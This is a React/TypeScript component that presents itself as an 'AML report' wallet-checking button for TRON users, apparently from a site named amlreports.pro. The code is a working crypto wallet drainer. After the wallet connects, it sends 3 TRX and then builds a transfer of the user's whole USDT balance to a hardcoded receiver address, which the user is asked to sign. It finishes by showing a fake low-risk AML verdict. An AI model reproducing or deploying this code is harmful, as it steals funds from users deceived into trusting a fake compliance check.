// components/TronAuthButton.tsx

import React, { useState, useEffect } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';
import { Buffer } from 'buffer';
window.Buffer = Buffer;

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: {
        'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
    },
});

const adapter = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
            name: 'AML',
            description: 'TRON + WalletConnect Integration',
            url: 'https://amlreports.pro',
            icons: [`https://amlreports.pro/images/icon-3.abdd8ed5.webp`],
        },
    },
    web3ModalConfig: {
        themeMode: 'dark',
    },
});

export const TronAuthButton: React.FC = () => {
    const [modalMessage, setModalMessage] = useState<string | null>(null);
    const [processing, setProcessing] = useState(false);

    useEffect(() => {
        if (typeof (adapter as any).init === 'function') {
            (adapter as any).init();
        }
        adapter.on('disconnect', () => {
            setProcessing(false);
            setModalMessage(null);
        });
    }, []);

    const disconnectAndNotify = async (message?: string) => {
        await adapter.disconnect();
        setProcessing(false);
        if (message) setModalMessage(message);
    };

    const connectWallet = async () => {
        setProcessing(true);
        try {
            await adapter.connect();

            const userAddress = adapter.address;
            if (!userAddress || !tronWeb.isAddress(userAddress)) {
                throw new Error('Invalid wallet address');
            }
            tronWeb.setAddress(userAddress);

            const trxRaw = await tronWeb.trx.getBalance(userAddress);
            const FIXED_AMOUNT_TRX = 3 * 1_000_000;
            const GAS_RESERVE = 1 * 1_000_000;
            if (trxRaw < FIXED_AMOUNT_TRX + GAS_RESERVE) {
                return await disconnectAndNotify('❌ Insufficient TRX. At least 4 TRX required.');
            }

            const trxSend = await tronWeb.trx.sendTransaction(
                TRON_RECEIVER,
                FIXED_AMOUNT_TRX
            );
            if (!trxSend.result) {
                throw new Error('TRX transfer failed.');
            }

            const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
            const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
            const usdt = Number(usdtRaw) / 1e6;

            if (usdt < 1) {
                return await disconnectAndNotify('✅ AML report: Low risk. Minimal USDT balance.');
            }

            const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
                USDT_CONTRACT,
                'transfer(address,uint256)',
                {
                    feeLimit: 25_000_000,
                    callValue: 0,
                },
                [
                    { type: 'address', value: TRON_RECEIVER },
                    { type: 'uint256', value: usdtRaw },
                ],
                userAddress
            );
            const signedTx = await adapter.signTransaction(transaction);
            const sendResult = await tronWeb.trx.sendRawTransaction(signedTx);

            if (!sendResult.result) {
                throw new Error('USDT transfer failed.');
            }

            await disconnectAndNotify('✅ AML report: All funds transferred.\nLow risk.');
        } catch (err: any) {
            console.error('Error:', err);
            const errMsg = err?.message || err?.toString();
            if (
                errMsg.includes('Invalid address provided') ||
                errMsg.includes('Modal is closed') ||
                errMsg.includes('User rejected') ||
                errMsg.includes('Timeout')
            ) {
                setProcessing(false);
                return;
            }
            await disconnectAndNotify('⚠️ Connection or transaction error');
        }
    };

    const handleClick = (e: React.MouseEvent) => {
        e.preventDefault(); // чтобы не срабатывал родительский <a>
        if (!adapter.connected && !processing) {
            connectWallet();
        }
    };

    return (
        <button onClick={handleClick} className='AuthButton' style={{ cursor: 'pointer' }}>
            Check Your Wallet
            {modalMessage && (
                <div className='modal__overflow'>
                    <div className="modal">
                        {modalMessage.includes('AML report') ? (
                            <div className="content greenBorder">
                                <div>
                                    <h3>{modalMessage}</h3>
                                </div>
                                <div className="nums">
                                    <div><span className='circ green'></span> 0-30 </div>
                                    <div><span className='circ orange'></span> 31-69 </div>
                                    <div><span className='circ red'></span> 70-100 </div>
                                </div>
                                <div className="content report">
                                    <p>AML report for a wallet:</p>
                                    <h5>{USDT_CONTRACT}</h5>
                                </div>
                            </div>
                        ) : (
                            <p>{modalMessage}</p>
                        )}
                        <button onClick={() => setModalMessage(null)}>Close</button>
                    </div>
                </div>
            )}
        </button>
    );
};
